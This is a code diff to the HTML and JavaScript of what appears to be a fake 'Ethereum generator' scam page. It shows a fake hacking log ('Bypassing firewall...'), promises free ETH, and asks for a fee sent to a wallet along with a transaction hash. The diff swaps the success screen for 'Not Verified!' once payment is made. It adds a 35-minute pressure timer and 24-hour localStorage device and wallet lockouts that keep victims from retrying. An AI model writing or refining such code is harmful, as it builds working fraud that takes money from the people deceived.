@@ -259,6 +259,36 @@
             margin-bottom: 2px;
         }
 
+        /* Error / lockout message styles */
+        .error-msg {
+            color: #ff4444;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            text-align: center;
+            text-shadow: 0 0 8px rgba(255, 68, 68, 0.5);
+        }
+        .error-sub {
+            color: #ffaa00;
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .countdown-display {
+            font-size: 28px;
+            color: #ff4444;
+            font-weight: bold;
+            text-align: center;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+        }
+        .lock-info {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
@@ -276,8 +306,8 @@
             </div>
 
             <!-- Timer -->
-            <div class="timer-box">
-                Session expires in: <span id="timer" class="timer-text">34:06</span>
+            <div class="timer-box" id="timerBox">
+                Session expires in: <span id="timer" class="timer-text">35:00</span>
                 <div style="font-size: 10px; color: #666; margin-top: 5px;">Latest check by the Team was made Today</div>
             </div>
 
@@ -347,17 +377,45 @@
                 <button class="btn" onclick="verifyTx()">Verify & Release Funds</button>
             </div>
             
-            <!-- Final Success -->
+            <!-- Final Step (Not Verified) -->
             <div id="step5" class="hidden">
-                <h2 style="color:#00ff00;">Verified!</h2>
-                <p>Your funds are being broadcast to the blockchain.</p>
+                <div class="error-msg">Not Verified!</div>
+                <div class="error-sub">Not Valid Deposit - Your funds are still being broadcast to the blockchain.</div>
+                <p style="color:#aaa; font-size:12px; margin-top:20px; text-align:center;">
+                    This session has been logged.<br>
+                    This device and wallet are locked for 24 hours.
+                </p>
+            </div>
+
+            <!-- Step 6: Locked Out (24h / device or session expiry) -->
+            <div id="stepLocked" class="hidden">
+                <div class="error-msg">ACCESS DENIED</div>
+                <div class="error-sub" id="lockedReason">This device or wallet has already been used for a session.</div>
+                <div class="countdown-display" id="lockCountdown">24:00:00</div>
+                <div class="lock-info">
+                    You must wait until the countdown reaches zero before using this device again.
+                </div>
+                <div class="lock-info" style="margin-top:20px; color:#666;" id="deviceIdDisplay"></div>
+            </div>
+
+            <!-- Step 7: Session Expired (during an active session) -->
+            <div id="stepExpired" class="hidden">
+                <div class="error-msg">SESSION EXPIRED</div>
+                <div class="error-sub">Your 35-minute window has closed before completion.</div>
+                <div class="countdown-display" id="expiredCountdown">24:00:00</div>
+                <div class="lock-info">
+                    The generator is now locked for 24 hours.<br>
+                    Please return after the countdown ends.
+                </div>
             </div>
 
         </div>
     </div>
 
     <script>
+        // ============================================================
         // --- Matrix Rain Effect Logic ---
+        // ============================================================
         const canvas = document.getElementById('matrixCanvas');
         const ctx = canvas.getContext('2d');
 
@@ -396,66 +454,303 @@
             }
         }
 
-        // Run matrix rain continuously
         setInterval(drawMatrix, 30);
 
-        // Resize listener
         window.addEventListener('resize', () => {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
         });
 
-        // --- Logic & State Management ---
+        // ============================================================
+        // --- Lock System (Client-side, localStorage based) ---
+        // ============================================================
+        // Rules:
+        //   - When user clicks Generate: session starts (35 min timer).
+        //   - A lock is immediately stored with expiry = now + 35min + 24h.
+        //   - The site is unusable for the same device+wallet for that entire period.
+        //   - If the 35-min session expires while user is on the site, they see
+        //     "SESSION EXPIRED" and the remaining 24h countdown.
+        //   - After the full lock expires, localStorage entry is cleared and user can use it again.
 
-        // 1. Timer Logic
-        let timeLeft = 34 * 60 + 6; // 34:06 in seconds
-        const timerElement = document.getElementById('timer');
+        const SESSION_DURATION_MS = 35 * 60 * 1000;          // 35 minutes
+        const LOCKOUT_DURATION_MS = 24 * 60 * 60 * 1000;      // 24 hours
+        const TOTAL_LOCK_MS = SESSION_DURATION_MS + LOCKOUT_DURATION_MS; // 24h 35min
 
-        const timerInterval = setInterval(() => {
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
+        // ---- Device ID ----
+        function getDeviceId() {
+            let deviceId = localStorage.getItem('eth_gen_device_id');
+            if (!deviceId) {
+                deviceId = 'dev_' + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+                localStorage.setItem('eth_gen_device_id', deviceId);
+            }
+            return deviceId;
+        }
+
+        // ---- Lock keys ----
+        function getLockKey(walletAddress) {
+            const deviceId = getDeviceId();
+            return 'eth_lock_' + deviceId + '_' + walletAddress.toLowerCase();
+        }
+
+        function getDeviceLockKey() {
+            return 'eth_device_lock_' + getDeviceId();
+        }
+
+        // ---- Lock read helpers ----
+        // Returns lockUntil timestamp (ms) if locked, or null if not locked / expired.
+        function getActiveLock(walletAddress) {
+            // Prefer wallet+device specific lock
+            if (walletAddress) {
+                const key = getLockKey(walletAddress);
+                const val = localStorage.getItem(key);
+                if (val) {
+                    const until = parseInt(val, 10);
+                    if (Date.now() < until) return until;
+                    localStorage.removeItem(key);
+                }
+            }
+            // Fall back to device-wide lock
+            const dKey = getDeviceLockKey();
+            const dVal = localStorage.getItem(dKey);
+            if (dVal) {
+                const until = parseInt(dVal, 10);
+                if (Date.now() < until) return until;
+                localStorage.removeItem(dKey);
+            }
+            return null;
+        }
+
+        function isDeviceLocked() {
+            const dKey = getDeviceLockKey();
+            const dVal = localStorage.getItem(dKey);
+            if (dVal) {
+                const until = parseInt(dVal, 10);
+                if (Date.now() < until) return until;
+                localStorage.removeItem(dKey);
+            }
+            return null;
+        }
+
+        // ---- Lock write helpers ----
+        // Lock expires 35min (session) + 24h (lockout) after this moment.
+        function setLock(walletAddress) {
+            const key = getLockKey(walletAddress);
+            const lockUntil = Date.now() + TOTAL_LOCK_MS;
+            localStorage.setItem(key, lockUntil.toString());
+        }
+
+        function setDeviceLock() {
+            const key = getDeviceLockKey();
+            const lockUntil = Date.now() + TOTAL_LOCK_MS;
+            localStorage.setItem(key, lockUntil.toString());
+        }
+
+        // ============================================================
+        // --- Time formatting ---
+        // ============================================================
+        function formatMMSS(ms) {
+            const totalSec = Math.max(0, Math.floor(ms / 1000));
+            const m = Math.floor(totalSec / 60);
+            const s = totalSec % 60;
+            return `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
+        }
+
+        function formatHHMMSS(ms) {
+            const totalSec = Math.max(0, Math.floor(ms / 1000));
+            const h = Math.floor(totalSec / 3600);
+            const m = Math.floor((totalSec % 3600) / 60);
+            const s = totalSec % 60;
+            return `${h < 10 ? '0'+h : h}:${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
+        }
+
+        // ============================================================
+        // --- UI section switching ---
+        // ============================================================
+        const allSteps = ['step1','step2','step3','step4','step5','stepLocked','stepExpired'];
+        function showStep(id) {
+            allSteps.forEach(s => {
+                const el = document.getElementById(s);
+                if (el) el.classList.add('hidden');
+            });
+            const target = document.getElementById(id);
+            if (target) target.classList.remove('hidden');
+        }
+
+        // ============================================================
+        // --- Global state ---
+        // ============================================================
+        let sessionTimerHandle = null;
+        let lockCountdownHandle = null;
+        let sessionEndTime = null; // timestamp when 35-min window ends
+        let activeWallet = null;
+
+        // ============================================================
+        // --- On page load: check locks ---
+        // ============================================================
+        window.addEventListener('load', () => {
+            // Check wallet-specific lock (we don't know wallet yet, but check device lock)
+            const deviceLockUntil = isDeviceLocked();
+            if (deviceLockUntil) {
+                // Device is locked. Show lock screen with countdown.
+                showLockScreen(deviceLockUntil, "This device has already been used for a generation session.");
                 return;
             }
-            timeLeft--;
-            let m = Math.floor(timeLeft / 60);
-            let s = timeLeft % 60;
-            timerElement.innerText = `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
-        }, 1000);
 
-        // 2. Slider and Dynamic Fee Logic
+            // Not locked → show Step 1
+            showStep('step1');
+            resetSessionTimer();
+        });
+
+        // ============================================================
+        // --- Lock screen with live countdown ---
+        // ============================================================
+        function showLockScreen(lockUntil, reason) {
+            showStep('stepLocked');
+            document.getElementById('lockedReason').innerText = reason;
+            document.getElementById('deviceIdDisplay').innerText = 'Device ID: ' + getDeviceId().substring(0, 12) + '...';
+
+            const cd = document.getElementById('lockCountdown');
+            cd.innerText = formatHHMMSS(lockUntil - Date.now());
+
+            if (lockCountdownHandle) clearInterval(lockCountdownHandle);
+            lockCountdownHandle = setInterval(() => {
+                const remaining = lockUntil - Date.now();
+                if (remaining <= 0) {
+                    clearInterval(lockCountdownHandle);
+                    lockCountdownHandle = null;
+                    // Lock expired → reload to reset state
+                    location.reload();
+                    return;
+                }
+                cd.innerText = formatHHMMSS(remaining);
+            }, 1000);
+        }
+
+        // ============================================================
+        // --- Session expired screen (35-min window closed mid-flow) ---
+        // ============================================================
+        function showSessionExpired() {
+            // Determine lock expiry from the stored lock
+            const wallet = activeWallet;
+            let lockUntil = null;
+            if (wallet) {
+                const key = getLockKey(wallet);
+                const val = localStorage.getItem(key);
+                if (val) lockUntil = parseInt(val, 10);
+            }
+            if (!lockUntil) {
+                const dKey = getDeviceLockKey();
+                const dVal = localStorage.getItem(dKey);
+                if (dVal) lockUntil = parseInt(dVal, 10);
+            }
+            if (!lockUntil) lockUntil = Date.now() + LOCKOUT_DURATION_MS;
+
+            showStep('stepExpired');
+            const cd = document.getElementById('expiredCountdown');
+            cd.innerText = formatHHMMSS(lockUntil - Date.now());
+
+            if (lockCountdownHandle) clearInterval(lockCountdownHandle);
+            lockCountdownHandle = setInterval(() => {
+                const remaining = lockUntil - Date.now();
+                if (remaining <= 0) {
+                    clearInterval(lockCountdownHandle);
+                    lockCountdownHandle = null;
+                    location.reload();
+                    return;
+                }
+                cd.innerText = formatHHMMSS(remaining);
+            }, 1000);
+        }
+
+        // ============================================================
+        // --- Session timer (35 minutes) ---
+        // ============================================================
+        function resetSessionTimer() {
+            if (sessionTimerHandle) clearInterval(sessionTimerHandle);
+            sessionTimerHandle = null;
+
+            const timerEl = document.getElementById('timer');
+            timerEl.innerText = formatMMSS(SESSION_DURATION_MS);
+            sessionEndTime = null;
+            activeWallet = null;
+        }
+
+        function startSessionTimer() {
+            if (sessionTimerHandle) clearInterval(sessionTimerHandle);
+            sessionEndTime = Date.now() + SESSION_DURATION_MS;
+
+            const timerEl = document.getElementById('timer');
+            timerEl.innerText = formatMMSS(SESSION_DURATION_MS);
+
+            sessionTimerHandle = setInterval(() => {
+                const remaining = sessionEndTime - Date.now();
+                if (remaining <= 0) {
+                    clearInterval(sessionTimerHandle);
+                    sessionTimerHandle = null;
+                    timerEl.innerText = '00:00';
+                    // Session over → lockout
+                    if (activeWallet) setLock(activeWallet);
+                    setDeviceLock();
+                    showSessionExpired();
+                    return;
+                }
+                timerEl.innerText = formatMMSS(remaining);
+            }, 1000);
+        }
+
+        // ============================================================
+        // --- Slider & Fee Logic ---
+        // ============================================================
         const slider = document.getElementById('amountSlider');
         const amountDisplay = document.getElementById('amountDisplay');
         const feeDisplay = document.getElementById('dynamicFee');
         const feeSpan = document.getElementById('feeTextSpan');
 
-        // Update UI and Fee on Slider Change
         slider.addEventListener('input', (e) => {
             const val = e.target.value;
             amountDisplay.innerText = val;
-            
-            // Calculate Fee: 1 ETH -> 0.018 Fee, 10 ETH -> 0.18 Fee
-            // Formula: Value * 0.018
             const fee = (val * 0.018).toFixed(3);
             feeDisplay.innerText = fee + " ETH";
             feeSpan.innerText = fee;
         });
 
-        // 3. Generator Simulation
+        // ============================================================
+        // --- startGenerator ---
+        // ============================================================
         function startGenerator() {
-            const wallet = document.getElementById('walletInput').value;
-            
-            if(!wallet) {
+            const wallet = document.getElementById('walletInput').value.trim();
+
+            if (!wallet) {
                 alert("Please enter a valid wallet address.");
                 return;
             }
+            if (!wallet.startsWith('0x') || wallet.length < 10) {
+                alert("Please enter a valid Ethereum wallet address (starting with 0x).");
+                return;
+            }
 
-            // Switch UI
-            document.getElementById('step1').classList.add('hidden');
-            document.getElementById('step2').classList.remove('hidden');
-            
+            // Check if this device or wallet is already locked
+            const lockUntil = getActiveLock(wallet);
+            if (lockUntil) {
+                // Already locked → show lock screen
+                showLockScreen(lockUntil, "This wallet or device has already been used for a session.");
+                return;
+            }
+
+            // ---- Enforce lock IMMEDIATELY ----
+            activeWallet = wallet;
+            setLock(wallet);
+            setDeviceLock();
+
+            // Start 35-minute session timer
+            startSessionTimer();
+
+            // Switch UI to simulation
+            showStep('step2');
+
             const logDiv = document.getElementById('matrixLog');
-            logDiv.innerHTML = ""; // Clear previous logs
-            
+            logDiv.innerHTML = "";
+
             const logs = [
                 "Connecting to Ethereum Mainnet...",
                 "Bypassing firewall...",
@@ -471,35 +766,34 @@
             ];
 
             let logIndex = 0;
-            const speed = 800; // ms per line
-            const maxLines = 15;
+            const speed = 800;
 
             const logInterval = setInterval(() => {
                 const p = document.createElement('div');
                 p.innerText = "> " + logs[logIndex % logs.length];
                 logDiv.appendChild(p);
-                logDiv.scrollTop = logDiv.scrollHeight; // Auto scroll
+                logDiv.scrollTop = logDiv.scrollHeight;
 
                 logIndex++;
-                if(logIndex > 20) {
+                if (logIndex > 20) {
                     clearInterval(logInterval);
-                    // Finish simulation
                     setTimeout(() => {
-                        showSuccess();
+                        // Only show success if the session hasn't expired
+                        if (sessionEndTime && Date.now() < sessionEndTime) {
+                            showSuccess();
+                        }
                     }, 1000);
                 }
             }, speed);
         }
 
         function showSuccess() {
-            document.getElementById('step2').classList.add('hidden');
-            document.getElementById('step3').classList.remove('hidden');
+            showStep('step3');
             document.getElementById('finalAmount').innerText = document.getElementById('amountSlider').value;
         }
 
         function showFeeSection() {
-            document.getElementById('step3').classList.add('hidden');
-            document.getElementById('step4').classList.remove('hidden');
+            showStep('step4');
         }
 
         function copyWallet() {
@@ -509,22 +803,54 @@
             });
         }
 
+        // ============================================================
+        // --- verifyTx (final step) ---
+        // ============================================================
         function verifyTx() {
             const txHash = document.getElementById('txHashInput').value;
-            if(txHash.length < 5) {
+            if (txHash.length < 5) {
                 alert("Please enter a valid Transaction Hash.");
                 return;
             }
 
-            // Fake loading
+            // If session already expired, block them
+            if (sessionEndTime && Date.now() >= sessionEndTime) {
+                setDeviceLock();
+                showSessionExpired();
+                return;
+            }
+
             const btn = document.querySelector('#step4 .btn');
-            const originalText = btn.innerText;
             btn.innerText = "Verifying on Blockchain...";
             btn.disabled = true;
 
             setTimeout(() => {
-                document.getElementById('step4').classList.add('hidden');
-                document.getElementById('step5').classList.remove('hidden');
+                // Show "Not Verified!" screen
+                showStep('step5');
+
+                // Ensure the lock is definitely in place (35min + 24h from now)
+                if (activeWallet) setLock(activeWallet);
+                setDeviceLock();
+
+                // After 5 seconds, transition to the lock countdown screen
+                // so user sees the 24h timer they must wait.
+                setTimeout(() => {
+                    const wallet = activeWallet;
+                    let lockUntil = null;
+                    if (wallet) {
+                        const key = getLockKey(wallet);
+                        const val = localStorage.getItem(key);
+                        if (val) lockUntil = parseInt(val, 10);
+                    }
+                    if (!lockUntil) {
+                        const dKey = getDeviceLockKey();
+                        const dVal = localStorage.getItem(dKey);
+                        if (dVal) lockUntil = parseInt(dVal, 10);
+                    }
+                    if (!lockUntil) lockUntil = Date.now() + TOTAL_LOCK_MS;
+
+                    showLockScreen(lockUntil, "Your session is complete. This device is now locked.");
+                }, 5000);
             }, 2000);
         }
     </script>
